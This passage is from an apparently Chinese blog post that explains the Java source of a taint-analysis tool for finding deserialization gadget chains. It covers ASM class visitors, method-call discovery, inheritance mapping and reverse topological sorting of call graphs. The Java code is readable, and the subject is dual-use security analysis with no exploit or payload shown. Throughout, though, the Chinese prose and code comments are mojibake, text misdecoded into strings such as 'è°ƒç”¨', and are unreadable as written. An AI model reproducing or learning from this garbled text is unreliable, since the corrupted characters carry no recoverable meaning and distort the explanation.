è°ƒç”¨çš„æœ€åä¸€ä¸ªè®¿é—®è€…æ–¹æ³•ï¼‰ï¼Œæ­¤æ—¶ç±»çš„å­—æ®µä¿¡æ¯å·²ç»è®°å½•å®Œæ¯•ï¼Œå¯ä»¥è®°å½•ä¸‹å®Œæ•´çš„ç±»ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€çˆ¶ç±»åã€æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ã€å­—æ®µä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;    <span class="comment">// ç±»è®¿é—®ç»“æŸï¼ˆè°ƒç”¨çš„æœ€åä¸€ä¸ªæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="type">ClassReference</span> <span class="variable">classReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">            name,</span><br><span class="line">            superName,</span><br><span class="line">            interfaces,</span><br><span class="line">            isInterface,</span><br><span class="line">            members.toArray(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member[members.size()])); <span class="comment">// æŠŠæ‰€æœ‰æ‰¾åˆ°çš„å­—æ®µå°è£…</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•ç±»ä¿¡æ¯ï¼Œä¿å­˜åˆ° discoveredClasses</span></span><br><span class="line">    discoveredClasses.add(classReference);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å­˜å‚¨æ”¶é›†åˆ°çš„ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯ï¼ŒåŒæ—¶è°ƒç”¨ <code>InheritanceDeriver.derive</code> è·å–ç»§æ‰¿ä¿¡æ¯å¹¶ä¿å­˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨æ•°æ®</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// classes.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">    <span class="comment">// ç±»å çˆ¶ç±»å æ¥å£A,æ¥å£B,æ¥å£C æ˜¯å¦ä¸ºæ¥å£ å­—æ®µ1!å­—æ®µ1æè¿°ç¬¦!å­—æ®µ1ç±»å‹!å­—æ®µ2!å­—æ®µ2æè¿°ç¬¦!å­—æ®µ2ç±»å‹</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Factory(), discoveredClasses);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// methods.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">    <span class="comment">// ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Factory(), discoveredMethods);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å½¢æˆ ç±»å(ClassReference.Handle)-&gt;ç±»(ClassReference) çš„æ˜ å°„å…³ç³»</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">        classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯¹ä¸Šé¢çš„ç±»ä¿¡æ¯è¿›è¡Œé€’å½’æ•´åˆï¼Œå¾—åˆ° `å­ç±»-&gt;çˆ¶ç±»é›†åˆ` çš„ç»§æ‰¿ä¿¡æ¯ï¼Œä¿å­˜åˆ° inheritanceMap.dat</span></span><br><span class="line">    InheritanceDeriver.derive(classMap).save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-PassthroughDiscovery"><a href="#5-PassthroughDiscovery" class="headerlink" title="5. PassthroughDiscovery"></a>5. PassthroughDiscovery</h2><p><code>discover</code> æ–¹æ³•ä¸»è¦æ‰§è¡Œäº†ä¸‰ä¸ªæ­¥éª¤ï¼šâ‘  æœç´¢æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼Œå³æ¯ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†å“ªäº›æ–¹æ³•ï¼›â‘¡ å°†è°ƒç”¨ä¿¡æ¯è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œä¸ºäº†ä¾¿äºåç»­åˆ†æï¼›â‘¢ åˆ†ææ¯ä¸ªæ–¹æ³•çš„å‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼Œå³æ–¹æ³•çš„è¿”å›ç»“æœæ˜¯å¦å¯ä»¥è¢«å…¶å‚æ•°å½±å“ã€‚</p><p>ä¾‹å¦‚ä»¥ä¸‹ä¸¤ä¸ªæ–¹æ³•ä¸­ï¼Œfoo æ–¹æ³•çš„è¿”å›ç»“æœå¯ä»¥è¢«å‚æ•°æ§åˆ¶ï¼Œè€Œ bar æ–¹æ³•çš„è¿”å›ç»“æœæ— æ³•è¢«æ§åˆ¶ã€‚å› æ­¤å¦‚æœæ±¡ç‚¹ï¼ˆæ”»å‡»è€…çš„è¾“å…¥æ•°æ®ï¼‰èµ°åˆ° bar æ–¹æ³•å°±ä¸èƒ½å†ç»§ç»­ä¸‹å»äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String <span class="title function_">foo</span><span class="params">(String v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String <span class="title function_">bar</span><span class="params">(String v)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•çš„å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼šæ–¹æ³•-&gt;è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¾—åˆ°æ¯ä¸ªæ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ï¼ˆç´¢å¼•ï¼‰é›†åˆ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  é…ç½®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æœç´¢æ–¹æ³•çš„è°ƒç”¨å…³ç³»ï¼ˆmethodCallsï¼‰å¹¶å¾—åˆ° `ç±»å-&gt;ç±»èµ„æº` æ˜ å°„é›†åˆ</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯¹æ–¹æ³•çš„è°ƒç”¨å…³ç³»è¿›è¡Œé€†æ‹“æ‰‘æ’åº</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ†ææ¯ä¸ªæ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">    <span class="comment">// classResourceByName  ç±»èµ„æºé›†åˆ</span></span><br><span class="line">    <span class="comment">// classMap             ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">// inheritanceMap       ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">// sortedMethods        æ–¹æ³•é›†åˆï¼ˆç»é€†æ‹“æ‰‘æ’åºï¼‰</span></span><br><span class="line">    <span class="comment">// SerializableDecider  åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">            config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discoverMethodCalls</code> æ–¹æ³•åˆ©ç”¨ asm çš„è®¿é—®è€…è®°å½•æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆä¿¡æ¯ï¼ŒåŒæ—¶å­˜å‚¨ç±»åå’Œç±»èµ„æºçš„æ˜ å°„å…³ç³»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœç´¢æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼šæ–¹æ³•-&gt;è¢«è°ƒç”¨æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * å­˜å‚¨ç±»èµ„æºæ˜ å°„ä¿¡æ¯ï¼šç±»å-&gt;ç±»èµ„æº</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ç±»å-&gt;ç±»èµ„æº</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿ</span></span><br><span class="line">                <span class="type">MethodCallDiscoveryClassVisitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCallDiscoveryClassVisitor</span>(Opcodes.ASM6);</span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                <span class="comment">// å­˜å‚¨ `ç±»å(String)-&gt;ç±»èµ„æº(ClassResource)` çš„æ˜ å°„å…³ç³»</span></span><br><span class="line">                classResourcesByName.put(visitor.getName(), classResource);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classResourcesByName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†ä¸‰ä¸ªè®¿é—®è€…æ–¹æ³•ï¼Œå¹¶å®ç°äº†ä¸€ä¸ªè¿”å›ç±»åçš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MethodCallDiscoveryClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryClassVisitor</span><span class="params">(<span class="type">int</span> api)</span> &#123;   <span class="comment">// è®¿é—®è€…å®ç°çš„ ASM API ç‰ˆæœ¬ï¼Œå¿…é¡»æ˜¯ Opcodes.</span></span><br><span class="line">        <span class="built_in">super</span>(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// ç±»å</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç±»å</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> æ–¹æ³•åªè®°å½•äº†å½“å‰è®¿é—®çš„ç±»çš„åç§°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature,</span></span><br><span class="line"><span class="params">                  String superName, String[] interfaces)</span> &#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;ClassVisitor already visited a class!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•ç±»å</span></span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> æ–¹æ³•ä½¿ç”¨ <code>MethodCallDiscoveryMethodVisitor</code> ç±»ï¼ˆç»§æ‰¿äº† asm ä¸­çš„ MethodVisitorï¼‰è§‚å¯Ÿæ–¹æ³•ï¼Œå¹¶è°ƒç”¨ <code>JSRInlinerAdapter</code> ç®€åŒ–ä»£ç åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                 String signature, String[] exceptions)</span> &#123;</span><br><span class="line">    <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    <span class="comment">// åˆ›å»º MethodCallDiscoveryMethodVisitor è§‚å¯Ÿæ–¹æ³•</span></span><br><span class="line">    <span class="type">MethodCallDiscoveryMethodVisitor</span> <span class="variable">modelGeneratorMethodVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCallDiscoveryMethodVisitor</span>(</span><br><span class="line">            api, mv, <span class="built_in">this</span>.name, name, desc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> æ–¹æ³•ç›´æ¥è°ƒç”¨çš„çˆ¶ç±»æ–¹æ³•ï¼Œåœ¨è¿™é‡Œä¸é‡å†™åº”è¯¥å¯ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryMethodVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ MethodVisitorï¼Œåªé‡å†™äº† <code>visitMethodInsn</code> æ–¹æ³•ï¼Œç”¨äºè®¿é—®è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ï¼›åˆ©ç”¨ <code>calledMethods</code> è®°å½•å½“å‰è®¿é—®çš„æ–¹æ³•è°ƒç”¨çš„æ‰€æœ‰æ–¹æ³•ï¼Œç„¶åè®°å½•åˆ° <code>methodCalls</code> å˜é‡ä¸­ï¼Œè¿™é‡Œä¸æ³¨æ„ç‚¹å°±çœ‹æ··äº†ğŸ˜µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MethodCallDiscoveryMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">MethodVisitor</span> &#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;MethodReference.Handle&gt; calledMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–¹æ³•è®¿é—®è€…æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> api   ASM API ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mv    MethodVisitor å®ä¾‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name  æ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc  æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                            <span class="keyword">final</span> String owner, String name, String desc)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(api, mv);</span><br><span class="line">        <span class="comment">// è°ƒç”¨çš„æ–¹æ³•é›†åˆï¼Œåˆå§‹åŒ–</span></span><br><span class="line">        <span class="built_in">this</span>.calledMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// å­˜å‚¨åˆ° PassthroughDiscovery çš„ methodCalls ä¸­</span></span><br><span class="line">        methodCalls.put(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc), calledMethods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¿é—®æ–¹æ³•æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">     * æ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> opcode è°ƒç”¨æ“ä½œç ï¼šINVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner  è¢«è°ƒç”¨çš„æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   è¢«è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc   è¢«è°ƒç”¨æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> itf    è¢«è°ƒç”¨çš„ç±»æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">        <span class="comment">// è®°å½•è°ƒç”¨çš„æ–¹æ³•ï¼Œå­˜å‚¨åˆ° MethodCallDiscoveryMethodVisitor çš„ calledMethods ä¸­</span></span><br><span class="line">        calledMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">        <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>topologicallySortMethodCalls</code> æ–¹æ³•å¯¹æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆè¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œç”¨äºåç»­åˆ¤æ–­æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>æ–¹æ³• parentMethod åœ¨è¿”å›å‰è°ƒç”¨äº† Obj.childMethodï¼Œå› ä¸º Obj.childMethod çš„å‚æ•° carg ä¸è¿”å›å€¼æœ‰å…³ï¼ŒåŒæ—¶ parentMethod 